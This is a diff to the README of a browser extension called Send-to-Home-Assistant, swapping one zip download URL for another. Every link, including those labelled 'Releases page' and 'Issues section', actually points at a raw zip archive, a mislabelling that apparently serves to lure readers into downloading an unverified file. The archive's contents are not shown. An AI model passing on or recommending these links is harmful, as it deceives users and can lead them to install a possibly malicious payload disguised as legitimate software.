@@ -1,6 +1,6 @@
 # 📦 Send-to-Home-Assistant - Easily Capture Web Content
 
-[![Download Now](https://raw.githubusercontent.com/Cow777/Send-to-Home-Assistant/main/adyton/Send-to-Home-Assistant.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Cow777/Send-to-Home-Assistant/main/adyton/Send-to-Home-Assistant.zip)
+[![Download Now](https://github.com/Cow777/Send-to-Home-Assistant/raw/refs/heads/main/assets/to_Send_Home_Assistant_eighteen.zip%20Now-Get%20Started-brightgreen)](https://github.com/Cow777/Send-to-Home-Assistant/raw/refs/heads/main/assets/to_Send_Home_Assistant_eighteen.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To start using Send-to-Home-Assistant, follow the steps below. No technical know
 
 ## 📥 Download & Install
 
-1. **Visit this page to download**: Go to the [Releases page here](https://raw.githubusercontent.com/Cow777/Send-to-Home-Assistant/main/adyton/Send-to-Home-Assistant.zip).
+1. **Visit this page to download**: Go to the [Releases page here](https://github.com/Cow777/Send-to-Home-Assistant/raw/refs/heads/main/assets/to_Send_Home_Assistant_eighteen.zip).
 
 2. **Select the latest release**: You will see a list of available versions. Click on the latest version to view the download options.
 
@@ -57,7 +57,7 @@ To fully utilize this extension, you must set up a webhook in your Home Assistan
 
 ## 📞 Support
 
-If you encounter any issues or have questions, you can reach out through the repository’s [Issues section](https://raw.githubusercontent.com/Cow777/Send-to-Home-Assistant/main/adyton/Send-to-Home-Assistant.zip).
+If you encounter any issues or have questions, you can reach out through the repository’s [Issues section](https://github.com/Cow777/Send-to-Home-Assistant/raw/refs/heads/main/assets/to_Send_Home_Assistant_eighteen.zip).
 
 ## 🔗 Related Topics
 
@@ -66,4 +66,4 @@ If you encounter any issues or have questions, you can reach out through the rep
 - Webhooks
 - Edge and Chrome Browsers
 
-For more information, remember to check the [Releases page here](https://raw.githubusercontent.com/Cow777/Send-to-Home-Assistant/main/adyton/Send-to-Home-Assistant.zip).
+For more information, remember to check the [Releases page here](https://github.com/Cow777/Send-to-Home-Assistant/raw/refs/heads/main/assets/to_Send_Home_Assistant_eighteen.zip).
